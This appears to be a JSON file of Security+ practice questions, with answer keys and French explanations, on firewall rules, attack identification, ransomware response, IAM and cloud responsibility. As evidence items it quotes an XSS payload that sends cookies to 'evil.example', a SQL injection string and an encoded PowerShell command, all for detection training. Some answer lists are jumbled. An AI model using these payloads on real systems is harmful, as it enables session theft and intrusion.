    "scenario": "12. Mod\u00e8le Messer PBQ - Best security technology for scenario\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'ajouter la technologie la plus applicable \u00e0 des sc\u00e9narios, avec des options comme NGFW, VPN, Sandboxing, SD-WAN, 802.1X. Le corrig\u00e9 associe par exemple VPN \u00e0 l'usage de Wi-Fi public, sandboxing aux tests avant d\u00e9ploiement, NGFW au blocage de sites malveillants, SD-WAN \u00e0 l'acc\u00e8s cloud multi-sites, et 802.1X \u00e0 l'authentification r\u00e9seau avec identifiants corporate.\n\nObjectif p\u00e9dagogique\n\nChoisir le contr\u00f4le le plus adapt\u00e9 \u00e0 un sc\u00e9nario.\n\nInterface\n\nType : scenario \u2192 technology matching\n\nScenario\tBest technology\nField engineer uses laptop in hotels and coffee shops\tDropdown\nDevelopers test applications before production\tDropdown\nAdmin blocks known malicious websites\tDropdown\nCorporate sites need direct optimized cloud access\tDropdown\nUsers must authenticate before joining wired/wireless network\tDropdown",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [],
    "tasks": [
      {
        "id": "messer-scenario-012-task-1",
        "kind": "matching",
        "title": "Best security technology for scenario",
        "prompt": "12. Mod\u00e8le Messer PBQ - Best security technology for scenario\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'ajouter la technologie la plus applicable \u00e0 des sc\u00e9narios, avec des options comme NGFW, VPN, Sandboxing, SD-WAN, 802.1X. Le corrig\u00e9 associe par exemple VPN \u00e0 l'usage de Wi-Fi public, sandboxing aux tests avant d\u00e9ploiement, NGFW au blocage de sites malveillants, SD-WAN \u00e0 l'acc\u00e8s cloud multi-sites, et 802.1X \u00e0 l'authentification r\u00e9seau avec identifiants corporate.\n\nObjectif p\u00e9dagogique\n\nChoisir le contr\u00f4le le plus adapt\u00e9 \u00e0 un sc\u00e9nario.\n\nInterface\n\nType : scenario \u2192 technology matching\n\nScenario\tBest technology\nField engineer uses laptop in hotels and coffee shops\tDropdown\nDevelopers test applications before production\tDropdown\nAdmin blocks known malicious websites\tDropdown\nCorporate sites need direct optimized cloud access\tDropdown\nUsers must authenticate before joining wired/wireless network\tDropdown",
        "options": [],
        "expectedAnswers": [
          "Scenario\tTechnology",
          "Public Wi-Fi protection\tVPN",
          "Test apps safely\tSandboxing",
          "Malicious web filtering\tNGFW",
          "Cloud access across branches\tSD-WAN",
          "Network authentication\t802.1X"
        ],
        "explanation": "12. Mod\u00e8le Messer PBQ - Best security technology for scenario\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'ajouter la technologie la plus applicable \u00e0 des sc\u00e9narios, avec des options comme NGFW, VPN, Sandboxing, SD-WAN, 802.1X. Le corrig\u00e9 associe par exemple VPN \u00e0 l'usage de Wi-Fi public, sandboxing aux tests avant d\u00e9ploiement, NGFW au blocage de sites malveillants, SD-WAN \u00e0 l'acc\u00e8s cloud multi-sites, et 802.1X \u00e0 l'authentification r\u00e9seau avec identifiants corporate.\n\nObjectif p\u00e9dagogique\n\nChoisir le contr\u00f4le le plus adapt\u00e9 \u00e0 un sc\u00e9nario.\n\nInterface\n\nType : scenario \u2192 technology matching\n\nScenario\tBest technology\nField engineer uses laptop in hotels and coffee shops\tDropdown\nDevelopers test applications before production\tDropdown\nAdmin blocks known malicious websites\tDropdown\nCorporate sites need direct optimized cloud access\tDropdown\nUsers must authenticate before joining wired/wireless network\tDropdown\nR\u00e9ponses attendues\nScenario\tTechnology\nPublic Wi-Fi protection\tVPN\nTest apps safely\tSandboxing\nMalicious web filtering\tNGFW\nCloud access across branches\tSD-WAN\nNetwork authentication\t802.1X\nPi\u00e8ges\nMauvais choix\tPourquoi\nVPN pour tous les sc\u00e9narios\tVPN prot\u00e8ge trafic distant, mais ne filtre pas tout.\nSandboxing pour r\u00e9seau Wi-Fi\tSandbox = environnement de test, pas tunnel r\u00e9seau.\nNGFW pour authentifier un utilisateur au port r\u00e9seau\t802.1X est fait pour \u00e7a.\nSD-WAN pour malware analysis\tSD-WAN optimise/contr\u00f4le WAN, pas l'analyse malware.",
        "traps": [
          "Mauvais choix\tPourquoi",
          "VPN pour tous les sc\u00e9narios\tVPN prot\u00e8ge trafic distant, mais ne filtre pas tout.",
          "Sandboxing pour r\u00e9seau Wi-Fi\tSandbox = environnement de test, pas tunnel r\u00e9seau.",
          "NGFW pour authentifier un utilisateur au port r\u00e9seau\t802.1X est fait pour \u00e7a.",
          "SD-WAN pour malware analysis\tSD-WAN optimise/contr\u00f4le WAN, pas l'analyse malware."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-001",
    "domain": "Security Operations",
    "type": "scenario_tasks",
    "title": "Stateful Firewall Rules / DMZ / Internal",
    "difficulty": "advanced",
    "timeLimitSeconds": 420,
    "role": "Security+ Candidate",
    "scenario": "You are a Security Administrator for a company with a DMZ and an internal network.\n\nThe firewall is stateful. Configure the firewall rules to meet the following requirements:\n\nBlock all HTTP sessions from the DMZ Web Server to the Internal Database Server.\nAllow the Internal Backup Server to send encrypted backups to the DMZ File Server using SFTP.\nAllow the Management Workstation to administer the DMZ Web Server using a secure terminal.\nBlock all Telnet traffic from any source to any destination.\nDo not create unnecessary return rules.\nNetwork diagram data\nDevice\tZone\tIP address\nWeb Server\tDMZ\t172.16.10.10\nFile Server\tDMZ\t172.16.10.20\nDatabase Server\tInternal\t10.10.20.30\nBackup Server\tInternal\t10.10.30.40\nManagement Workstation\tInternal\t10.10.50.25\nInternet\tExternal\tANY\nAvailable ports\nService\tPort / Protocol\nHTTP\tTCP/80\nHTTPS\tTCP/443\nSSH\tTCP/22\nSFTP\tTCP/22\nTelnet\tTCP/23\nRDP\tTCP/3389\nDNS\tTCP/UDP 53",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "4.5"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-001-task-1",
        "kind": "table_completion",
        "title": "Stateful Firewall Rules / DMZ / Internal",
        "prompt": "You are a Security Administrator for a company with a DMZ and an internal network.\n\nThe firewall is stateful. Configure the firewall rules to meet the following requirements:\n\nBlock all HTTP sessions from the DMZ Web Server to the Internal Database Server.\nAllow the Internal Backup Server to send encrypted backups to the DMZ File Server using SFTP.\nAllow the Management Workstation to administer the DMZ Web Server using a secure terminal.\nBlock all Telnet traffic from any source to any destination.\nDo not create unnecessary return rules.\nNetwork diagram data\nDevice\tZone\tIP address\nWeb Server\tDMZ\t172.16.10.10\nFile Server\tDMZ\t172.16.10.20\nDatabase Server\tInternal\t10.10.20.30\nBackup Server\tInternal\t10.10.30.40\nManagement Workstation\tInternal\t10.10.50.25\nInternet\tExternal\tANY\nAvailable ports\nService\tPort / Protocol\nHTTP\tTCP/80\nHTTPS\tTCP/443\nSSH\tTCP/22\nSFTP\tTCP/22\nTelnet\tTCP/23\nRDP\tTCP/3389\nDNS\tTCP/UDP 53",
        "options": [],
        "expectedAnswers": [
          "Rule #\tSource IP\tDestination IP\tProtocol\tPort\tAllow / Block",
          "1\t172.16.10.10\t10.10.20.30\tTCP\t80\tBlock",
          "2\t10.10.30.40\t172.16.10.20\tTCP\t22\tAllow",
          "3\t10.10.50.25\t172.16.10.10\tTCP\t22\tAllow",
          "4\tANY\tANY\tTCP\t23\tBlock"
        ],
        "explanation": "HTTP utilise TCP/80, donc le trafic Web Server \u2192 Database Server doit \u00eatre bloqu\u00e9 sur TCP/80.\nSFTP utilise SSH, donc TCP/22.\n\"Secure terminal\" = SSH, donc TCP/22.\nTelnet = TCP/23, non s\u00e9curis\u00e9, donc bloqu\u00e9 globalement.\nLe firewall est stateful, donc il ne faut pas ajouter une r\u00e8gle retour pour le trafic r\u00e9ponse. C'est exactement le genre de logique que Messer met en avant dans ses PBQ firewall : source, destination, protocole, port, action, puis pas de r\u00e8gle retour inutile sur un firewall stateful.",
        "traps": [],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-002",
    "domain": "Threats, Vulnerabilities, and Mitigations",
    "type": "scenario_tasks",
    "title": "Match Attack Type to Evidence and Mitigation",
    "difficulty": "advanced",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "You are a SOC Analyst reviewing several alerts. Match each evidence item to the MOST accurate attack type and the BEST mitigation.\n\nNot all options will be used.\n\nEvidence list\nID\tEvidence\nE1\tGET /search?q=<script>document.location='http://evil.example/cookie?c='+document.cookie</script>\nE2\tGET /item?id=105 OR 1=1 --\nE3\tA user receives an SMS asking them to verify their payroll account.\nE4\tDNS logs show thousands of TXT queries to random subdomains under exfil.example.net.\nE5\tDec 30 08:40:03 web01 Failed password for root from 203.0.113.77 ssh2 repeated 900 times.\nAttack type options\nCross-site scripting\nSQL injection\nSmishing\nDNS tunneling\nBrute force\nDDoS\nRFID cloning\nOn-path attack\nMitigation options\nOutput encoding and input validation\nParameterized queries\nSecurity awareness training and SMS filtering\nDNS filtering and DLP monitoring\nAccount lockout and disable root SSH login\nIncrease RAID redundancy\nCertificate pinning\nDisable DHCP",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "2.4",
      "2.5"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-002-task-1",
        "kind": "matching",
        "title": "Match Attack Type to Evidence and Mitigation",
        "prompt": "You are a SOC Analyst reviewing several alerts. Match each evidence item to the MOST accurate attack type and the BEST mitigation.\n\nNot all options will be used.\n\nEvidence list\nID\tEvidence\nE1\tGET /search?q=<script>document.location='http://evil.example/cookie?c='+document.cookie</script>\nE2\tGET /item?id=105 OR 1=1 --\nE3\tA user receives an SMS asking them to verify their payroll account.\nE4\tDNS logs show thousands of TXT queries to random subdomains under exfil.example.net.\nE5\tDec 30 08:40:03 web01 Failed password for root from 203.0.113.77 ssh2 repeated 900 times.\nAttack type options\nCross-site scripting\nSQL injection\nSmishing\nDNS tunneling\nBrute force\nDDoS\nRFID cloning\nOn-path attack\nMitigation options\nOutput encoding and input validation\nParameterized queries\nSecurity awareness training and SMS filtering\nDNS filtering and DLP monitoring\nAccount lockout and disable root SSH login\nIncrease RAID redundancy\nCertificate pinning\nDisable DHCP",
        "options": [
          "Cross-site scripting",
          "SQL injection",
          "Smishing",
          "DNS tunneling",
          "Brute force",
          "DDoS",
          "RFID cloning",
          "On-path attack",
          "Mitigation options",
          "Output encoding and input validation",
          "Parameterized queries",
          "Security awareness training and SMS filtering",
          "DNS filtering and DLP monitoring",
          "Account lockout and disable root SSH login",
          "Increase RAID redundancy",
          "Certificate pinning",
          "Disable DHCP",
          "Evidence\tAttack Type\tBest Mitigation",
          "E1\tCross-site scripting\tOutput encoding and input validation",
          "E2\tSQL injection\tParameterized queries",
          "E3\tSmishing\tSecurity awareness training and SMS filtering",
          "E4\tDNS tunneling\tDNS filtering and DLP monitoring",
          "E5\tBrute force\tAccount lockout and disable root SSH login"
        ],
        "expectedAnswers": [
          "Evidence\tAttack Type\tBest Mitigation",
          "E1\tCross-site scripting\tOutput encoding and input validation",
          "E2\tSQL injection\tParameterized queries",
          "E3\tSmishing\tSecurity awareness training and SMS filtering",
          "E4\tDNS tunneling\tDNS filtering and DLP monitoring",
          "E5\tBrute force\tAccount lockout and disable root SSH login"
        ],
        "explanation": "<script> dans un param\u00e8tre web = XSS.\nOR 1=1 -- dans une requ\u00eate = SQL injection.\nMessage SMS malveillant = smishing.\nBeaucoup de requ\u00eates DNS TXT vers sous-domaines al\u00e9atoires = DNS tunneling / exfiltration.\n\u00c9checs SSH r\u00e9p\u00e9t\u00e9s sur root depuis une m\u00eame IP = brute force.",
        "traps": [
          "Pi\u00e8ge\tExplication",
          "XSS vs SQLi\tXSS contient souvent <script> ; SQLi contient souvent ' OR 1=1",
          "Smishing vs phishing\tSMS = smishing",
          "DNS tunneling vs DGA\tDNS tunneling transporte donn\u00e9es ; DGA g\u00e9n\u00e8re domaines al\u00e9atoires pour C2",
          "Brute force vs spraying\tIci un seul compte root avec beaucoup d'essais = brute force"
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-003",
    "domain": "General Security Concepts",
    "type": "scenario_tasks",
    "title": "Security Controls Placement",
    "difficulty": "advanced",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "A manufacturing company is improving physical and logical security. Select the BEST security control for each location or requirement.\n\nAll controls will be used once.\n\nAvailable controls\nFencing\nLighting\nAccess control vestibule\nSecurity guard\nBadge reader\nBiometric scanner\nHoneyfile\nSIEM forwarding\nRequirements\nLocation / Requirement\tBest control\nR1. Parking lot and vehicle drop-off area must discourage unauthorized access at night.\t?\nR2. Outer perimeter of the manufacturing facility must define a physical boundary.\t?\nR3. Reception area must have a person verifying visitor identity.\t?\nR4. Data center entrance must prevent tailgating.\t?\nR5. Server room door must allow employee card access.\t?\nR6. Data center console access must verify a unique human characteristic.\t?\nR7. A decoy file should alert if unauthorized users access sensitive project folders.\t?\nR8. System logs must be automatically transferred to a central monitoring platform.\t?",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "1.1",
      "1.2"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-003-task-1",
        "kind": "single_choice",
        "title": "Security Controls Placement",
        "prompt": "A manufacturing company is improving physical and logical security. Select the BEST security control for each location or requirement.\n\nAll controls will be used once.\n\nAvailable controls\nFencing\nLighting\nAccess control vestibule\nSecurity guard\nBadge reader\nBiometric scanner\nHoneyfile\nSIEM forwarding\nRequirements\nLocation / Requirement\tBest control\nR1. Parking lot and vehicle drop-off area must discourage unauthorized access at night.\t?\nR2. Outer perimeter of the manufacturing facility must define a physical boundary.\t?\nR3. Reception area must have a person verifying visitor identity.\t?\nR4. Data center entrance must prevent tailgating.\t?\nR5. Server room door must allow employee card access.\t?\nR6. Data center console access must verify a unique human characteristic.\t?\nR7. A decoy file should alert if unauthorized users access sensitive project folders.\t?\nR8. System logs must be automatically transferred to a central monitoring platform.\t?",
        "options": [
          "Fencing",
          "Lighting",
          "Access control vestibule",
          "Security guard",
          "Badge reader",
          "Biometric scanner",
          "Honeyfile",
          "SIEM forwarding",
          "Requirements",
          "Location / Requirement\tBest control",
          "R1. Parking lot and vehicle drop-off area must discourage unauthorized access at night.\t?",
          "R2. Outer perimeter of the manufacturing facility must define a physical boundary.\t?",
          "R3. Reception area must have a person verifying visitor identity.\t?",
          "R4. Data center entrance must prevent tailgating.\t?",
          "R5. Server room door must allow employee card access.\t?",
          "R6. Data center console access must verify a unique human characteristic.\t?",
          "R7. A decoy file should alert if unauthorized users access sensitive project folders.\t?",
          "R8. System logs must be automatically transferred to a central monitoring platform.\t?",
          "Requirement\tCorrect control"
        ],
        "expectedAnswers": [
          "Requirement\tCorrect control",
          "R1\tLighting",
          "R2\tFencing",
          "R3\tSecurity guard",
          "R4\tAccess control vestibule",
          "R5\tBadge reader",
          "R6\tBiometric scanner",
          "R7\tHoneyfile",
          "R8\tSIEM forwarding"
        ],
        "explanation": "Lighting est surtout un contr\u00f4le deterrent : il d\u00e9courage.\nFencing d\u00e9finit et prot\u00e8ge le p\u00e9rim\u00e8tre.\nSecurity guard = contr\u00f4le operational, car c'est une personne.\nAccess control vestibule limite le tailgating.\nBadge reader = contr\u00f4le d'acc\u00e8s physique/technique.\nBiometrics = \"something you are\".\nHoneyfile = fichier leurre.\nSIEM forwarding = contr\u00f4le technique de monitoring.\n\nLes objectifs officiels listent pr\u00e9cis\u00e9ment ces cat\u00e9gories et contr\u00f4les physiques : fencing, access control vestibule, video surveillance, security guard, access badge, lighting, sensors, honeypot/honeyfile/honeytoken.",
        "traps": [
          "Mauvais choix\tPourquoi",
          "Security guard = physical seulement\tCompTIA le classe souvent operational quand l'action humaine est centrale",
          "Access badge pour emp\u00eacher tailgating\tUn badge seul n'emp\u00eache pas forc\u00e9ment qu'une personne suive",
          "Honeyfile vs honeypot\tHoneyfile = fichier leurre ; honeypot = syst\u00e8me leurre",
          "Lighting = detective\tLighting d\u00e9courage surtout, ne d\u00e9tecte pas directement"
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-004",
    "domain": "Security Operations",
    "type": "scenario_tasks",
    "title": "Incident Response: Ransomware Timeline",
    "difficulty": "advanced",
    "timeLimitSeconds": 420,
    "role": "Security+ Candidate",
    "scenario": "You are an Incident Responder. Users report that files on a shared drive are renamed with the .locked extension.\n\nReview the following events:\n\n09:14  HR-WS-22  user=agarcia opened attachment payroll_update.xlsm\n09:15  HR-WS-22  powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA\n09:16  HR-WS-22  outbound connection 198.51.100.77:443\n09:17  FS-01     SMB writes from HR-WS-22 increased by 900%\n09:18  FS-01     files renamed *.docx -> *.locked\n09:19  FS-01     backup share access attempt failed\n09:20  SIEM      alert: suspicious PowerShell + mass file modification\nTask 1 - Select the MOST likely attack\nRansomware\nSQL injection\nDNS poisoning\nCredential stuffing\nTask 2 - Place the actions in the correct order\nRecover from verified offline backups\nIsolate HR-WS-22 from the network\nEradicate malware and persistence\nAnalyze logs and determine scope\nConduct lessons learned\nConfirm detection and declare incident",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "4.8",
      "4.9"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-004-task-1",
        "kind": "ordering",
        "title": "Incident Response: Ransomware Timeline",
        "prompt": "You are an Incident Responder. Users report that files on a shared drive are renamed with the .locked extension.\n\nReview the following events:\n\n09:14  HR-WS-22  user=agarcia opened attachment payroll_update.xlsm\n09:15  HR-WS-22  powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA\n09:16  HR-WS-22  outbound connection 198.51.100.77:443\n09:17  FS-01     SMB writes from HR-WS-22 increased by 900%\n09:18  FS-01     files renamed *.docx -> *.locked\n09:19  FS-01     backup share access attempt failed\n09:20  SIEM      alert: suspicious PowerShell + mass file modification\nTask 1 - Select the MOST likely attack\nRansomware\nSQL injection\nDNS poisoning\nCredential stuffing\nTask 2 - Place the actions in the correct order\nRecover from verified offline backups\nIsolate HR-WS-22 from the network\nEradicate malware and persistence\nAnalyze logs and determine scope\nConduct lessons learned\nConfirm detection and declare incident",
        "options": [],
        "expectedAnswers": [
          "Use immutable offline backups and EDR containment",
          "Confirm detection and declare incident",
          "Analyze logs and determine scope",
          "Isolate HR-WS-22 from the network",
          "Eradicate malware and persistence",
          "Recover from verified offline backups",
          "Conduct lessons learned",
          "Task 3 - Select THREE indicators of compromise",
          "PowerShell EncodedCommand",
          "Mass file rename to .locked",
          "SMB write spike",
          "Normal HTTPS traffic to Microsoft update",
          "Successful user login during business hours",
          "Backup share access attempt",
          "Expected IOCs",
          "Task 4 - Best long-term mitigation",
          "Disable all email",
          "Allow macros for all HR spreadsheets",
          "Move file server to the DMZ",
          "Expected answer"
        ],
        "explanation": "PBQ 4 - Incident Response: Ransomware Timeline\nDomaine SY0-701\n\n4.8 - Incident response activities\n4.9 - Use data sources to support investigation\n\nType d'interface\n\nMulti-step PBQ :\n\nIdentifier l'attaque\nOrdonner les actions\nChoisir les preuves\nChoisir la mitigation long terme\nPrompt candidat\n\nYou are an Incident Responder. Users report that files on a shared drive are renamed with the .locked extension.\n\nReview the following events:\n\n09:14  HR-WS-22  user=agarcia opened attachment payroll_update.xlsm\n09:15  HR-WS-22  powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA\n09:16  HR-WS-22  outbound connection 198.51.100.77:443\n09:17  FS-01     SMB writes from HR-WS-22 increased by 900%\n09:18  FS-01     files renamed *.docx -> *.locked\n09:19  FS-01     backup share access attempt failed\n09:20  SIEM      alert: suspicious PowerShell + mass file modification\nTask 1 - Select the MOST likely attack\nRansomware\nSQL injection\nDNS poisoning\nCredential stuffing\nTask 2 - Place the actions in the correct order\nRecover from verified offline backups\nIsolate HR-WS-22 from the network\nEradicate malware and persistence\nAnalyze logs and determine scope\nConduct lessons learned\nConfirm detection and declare incident\nExpected order\nConfirm detection and declare incident\nAnalyze logs and determine scope\nIsolate HR-WS-22 from the network\nEradicate malware and persistence\nRecover from verified offline backups\nConduct lessons learned\nTask 3 - Select THREE indicators of compromise\nPowerShell EncodedCommand\nMass file rename to .locked\nSMB write spike\nNormal HTTPS traffic to Microsoft update\nSuccessful user login during business hours\nBackup share access attempt\nExpected IOCs\nPowerShell EncodedCommand\nMass file rename to .locked\nSMB write spike\nTask 4 - Best long-term mitigation\nDisable all email\nUse immutable offline backups and EDR containment\nAllow macros for all HR spreadsheets\nMove file server to the DMZ\nExpected answer\n\nUse immutable offline backups and EDR containment\n\nScoring\nCrit\u00e8re\tPoints\nAttaque identifi\u00e9e\t20\nOrdre IR correct\t30\nTrois IOCs corrects\t30\nMitigation long terme correcte\t20\nPi\u00e8ges\nPi\u00e8ge\tPourquoi faux\nRecovery avant eradication\tPeut restaurer dans un environnement encore compromis\nReboot workstation first\tPeut d\u00e9truire preuves volatiles\nDelete encrypted files\tMauvaise r\u00e9ponse, perte de donn\u00e9es\nDisable all email\tTrop large, mauvais impact op\u00e9rationnel",
        "traps": [
          "Pi\u00e8ge\tPourquoi faux",
          "Recovery avant eradication\tPeut restaurer dans un environnement encore compromis",
          "Reboot workstation first\tPeut d\u00e9truire preuves volatiles",
          "Delete encrypted files\tMauvaise r\u00e9ponse, perte de donn\u00e9es",
          "Disable all email\tTrop large, mauvais impact op\u00e9rationnel"
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-005",
    "domain": "Security Operations",
    "type": "scenario_tasks",
    "title": "IAM / Federation / Access Control",
    "difficulty": "advanced",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "You are an Identity Administrator implementing access controls for a company using cloud applications.\n\nMatch each requirement to the BEST solution.\n\nRequirements\nID\tRequirement\nR1\tUsers should access multiple cloud applications after one login.\nR2\tA third-party app should access a user's calendar without receiving the user's password.\nR3\tAccess to payroll should depend on department, device compliance, location, and time of day.\nR4\tFile owners should be able to grant read access to their own project files.\nR5\tFormer employees must immediately lose access to all systems.\nR6\tAdmin privileges should be granted temporarily only when needed.\nAvailable solutions\nSSO\nOAuth\nABAC\nDAC\nDeprovisioning\nJust-in-time PAM\nMAC\nPSK\nKerberos only",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "1.2",
      "4.6"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-005-task-1",
        "kind": "matching",
        "title": "IAM / Federation / Access Control",
        "prompt": "You are an Identity Administrator implementing access controls for a company using cloud applications.\n\nMatch each requirement to the BEST solution.\n\nRequirements\nID\tRequirement\nR1\tUsers should access multiple cloud applications after one login.\nR2\tA third-party app should access a user's calendar without receiving the user's password.\nR3\tAccess to payroll should depend on department, device compliance, location, and time of day.\nR4\tFile owners should be able to grant read access to their own project files.\nR5\tFormer employees must immediately lose access to all systems.\nR6\tAdmin privileges should be granted temporarily only when needed.\nAvailable solutions\nSSO\nOAuth\nABAC\nDAC\nDeprovisioning\nJust-in-time PAM\nMAC\nPSK\nKerberos only",
        "options": [
          "SSO",
          "OAuth",
          "ABAC",
          "DAC",
          "Deprovisioning",
          "Just-in-time PAM",
          "MAC",
          "PSK",
          "Kerberos only",
          "Requirement\tSolution",
          "R1\tSSO",
          "R2\tOAuth",
          "R3\tABAC",
          "R4\tDAC",
          "R5\tDeprovisioning",
          "R6\tJust-in-time PAM"
        ],
        "expectedAnswers": [
          "Requirement\tSolution",
          "R1\tSSO",
          "R2\tOAuth",
          "R3\tABAC",
          "R4\tDAC",
          "R5\tDeprovisioning",
          "R6\tJust-in-time PAM"
        ],
        "explanation": "SSO = one login, multiple apps.\nOAuth = delegated authorization, no password sharing.\nABAC = attributes such as location, device, time, department.\nDAC = owner controls permissions.\nDeprovisioning = remove access when leaving.\nJIT PAM = temporary privileged access.",
        "traps": [
          "Confusion\tCorrection",
          "OAuth = authentication\tOAuth est surtout authorization ; OIDC ajoute authentication",
          "RBAC vs ABAC\tIci plusieurs attributs dynamiques \u2192 ABAC",
          "Offboarding vs deprovisioning\tOffboarding est processus RH/global ; deprovisioning retire les comptes/acc\u00e8s",
          "PAM vs MFA\tMFA v\u00e9rifie identit\u00e9 ; PAM g\u00e8re privil\u00e8ges admin"
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-006",
    "domain": "Security Architecture",
    "type": "scenario_tasks",
    "title": "Cloud Shared Responsibility + Misconfiguration",
    "difficulty": "advanced",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "You are a Cloud Security Analyst reviewing a public cloud deployment.\n\nThe company uses:\n\nSaaS email\nIaaS virtual machines\nCloud object storage\nManaged database service\n\nA recent audit found that one object storage bucket containing customer invoices is publicly readable.\n\nTask 1 - Classify responsibility\nItem\tCustomer / Provider / Shared\nPhysical datacenter security\t?\nSaaS email application patching\t?\nIaaS guest OS patching\t?\nCustomer data classification\t?\nObject storage access policy\t?\nHypervisor maintenance\t?\nIdentity and access configuration\t?",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "3.1",
      "4.1",
      "5.2"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-006-task-1",
        "kind": "classification",
        "title": "Cloud Shared Responsibility + Misconfiguration",
        "prompt": "You are a Cloud Security Analyst reviewing a public cloud deployment.\n\nThe company uses:\n\nSaaS email\nIaaS virtual machines\nCloud object storage\nManaged database service\n\nA recent audit found that one object storage bucket containing customer invoices is publicly readable.\n\nTask 1 - Classify responsibility\nItem\tCustomer / Provider / Shared\nPhysical datacenter security\t?\nSaaS email application patching\t?\nIaaS guest OS patching\t?\nCustomer data classification\t?\nObject storage access policy\t?\nHypervisor maintenance\t?\nIdentity and access configuration\t?",
        "options": [],
        "expectedAnswers": [
          "Disable public access and review access logs",
          "Task 3 - Select the MOST likely vulnerability type",
          "Cloud misconfiguration",
          "Race condition",
          "Buffer overflow",
          "End-of-life system",
          "Expected answer",
          "Item\tResponsibility",
          "Physical datacenter security\tProvider",
          "SaaS email application patching\tProvider",
          "IaaS guest OS patching\tCustomer",
          "Customer data classification\tCustomer",
          "Object storage access policy\tCustomer",
          "Hypervisor maintenance\tProvider",
          "Identity and access configuration\tShared / Customer-heavy",
          "Task 2 - Select the FIRST action",
          "Delete the bucket",
          "Move all data to tape backup",
          "Change the company's public DNS records"
        ],
        "explanation": "PBQ 6 - Cloud Shared Responsibility + Misconfiguration\nDomaine SY0-701\n\n3.1 - Architecture models\n4.1 - Cloud infrastructure security\n5.2 - Risk management\n\nType d'interface\n\nClasser les responsabilit\u00e9s + choisir l'action prioritaire.\n\nPrompt candidat\n\nYou are a Cloud Security Analyst reviewing a public cloud deployment.\n\nThe company uses:\n\nSaaS email\nIaaS virtual machines\nCloud object storage\nManaged database service\n\nA recent audit found that one object storage bucket containing customer invoices is publicly readable.\n\nTask 1 - Classify responsibility\nItem\tCustomer / Provider / Shared\nPhysical datacenter security\t?\nSaaS email application patching\t?\nIaaS guest OS patching\t?\nCustomer data classification\t?\nObject storage access policy\t?\nHypervisor maintenance\t?\nIdentity and access configuration\t?\nExpected classification\nItem\tResponsibility\nPhysical datacenter security\tProvider\nSaaS email application patching\tProvider\nIaaS guest OS patching\tCustomer\nCustomer data classification\tCustomer\nObject storage access policy\tCustomer\nHypervisor maintenance\tProvider\nIdentity and access configuration\tShared / Customer-heavy\nTask 2 - Select the FIRST action\nDelete the bucket\nDisable public access and review access logs\nMove all data to tape backup\nChange the company's public DNS records\nExpected answer\n\nDisable public access and review access logs\n\nTask 3 - Select the MOST likely vulnerability type\nCloud misconfiguration\nRace condition\nBuffer overflow\nEnd-of-life system\nExpected answer\n\nCloud misconfiguration\n\nScoring\nCrit\u00e8re\tPoints\nResponsabilit\u00e9s correctement class\u00e9es\t50\nFIRST action correcte\t25\nVulnerability type correct\t25\nPi\u00e8ges\nPi\u00e8ge\tPourquoi\n\"Cloud provider is responsible for everything\"\tFaux en cloud, surtout IaaS/data/IAM\nDelete bucket first\tRisque de d\u00e9truire preuves\nDNS change\tHors sujet\nSaaS vs IaaS\tResponsabilit\u00e9s tr\u00e8s diff\u00e9rentes",
        "traps": [
          "Pi\u00e8ge\tPourquoi",
          "\"Cloud provider is responsible for everything\"\tFaux en cloud, surtout IaaS/data/IAM",
          "Delete bucket first\tRisque de d\u00e9truire preuves",
          "DNS change\tHors sujet",
          "SaaS vs IaaS\tResponsabilit\u00e9s tr\u00e8s diff\u00e9rentes"
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-007",
    "domain": "Security Operations",
    "type": "scenario_tasks",
